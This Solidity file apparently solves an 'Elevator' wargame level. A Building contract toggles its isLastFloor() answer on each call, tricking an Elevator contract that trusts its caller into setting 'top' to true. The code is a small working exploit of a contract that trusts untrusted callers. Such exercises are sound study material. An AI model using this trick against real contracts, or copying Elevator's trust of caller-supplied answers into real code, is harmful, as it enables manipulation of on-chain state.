// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Building {
  bool public lock = true; 
  function isLastFloor(uint _floor) external returns (bool) {
      lock = !lock;
      return lock;
  }

  function callGoTo(address target, uint _floor) external {
      Elevator(target).goTo(_floor);
  }

  function helper() external pure returns (uint) {
      return type(uint).max;
  }
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}